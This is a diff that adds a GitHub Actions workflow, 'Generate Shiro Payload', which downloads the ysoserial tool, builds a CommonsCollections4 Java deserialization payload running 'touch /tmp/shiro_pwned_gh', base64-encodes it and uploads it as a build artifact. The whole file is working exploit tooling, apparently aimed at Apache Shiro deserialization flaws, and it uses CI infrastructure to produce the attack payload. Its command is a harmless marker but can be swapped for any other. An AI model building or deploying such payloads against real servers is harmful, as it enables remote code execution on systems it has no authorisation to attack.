@@ -1,0 +1,34 @@
+name: Generate Shiro Payload
+
+on:
+  workflow_dispatch:
+
+jobs:
+  generate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Download ysoserial
+        run: |
+          wget -q https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
+          
+      - name: Generate CommonsCollections4 payload
+        run: |
+          java -jar ysoserial-all.jar CommonsCollections4 "touch /tmp/shiro_pwned_gh" > /tmp/payload.bin 2>/dev/null
+          echo "Payload size: $(wc -c < /tmp/payload.bin) bytes"
+          
+      - name: Base64 encode
+        run: |
+          base64 -w0 /tmp/payload.bin > /tmp/payload.b64
+          echo "Base64 size: $(wc -c < /tmp/payload.b64)"
+          echo "=== PAYLOAD_START ==="
+          head -c 200 /tmp/payload.b64
+          echo ""
+          echo "... (truncated, full payload in artifact)"
+          echo "=== PAYLOAD_END ==="
+          
+      - name: Upload payload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: shiro-payload
+          path: /tmp/payload.b64
+          retention-days: 1
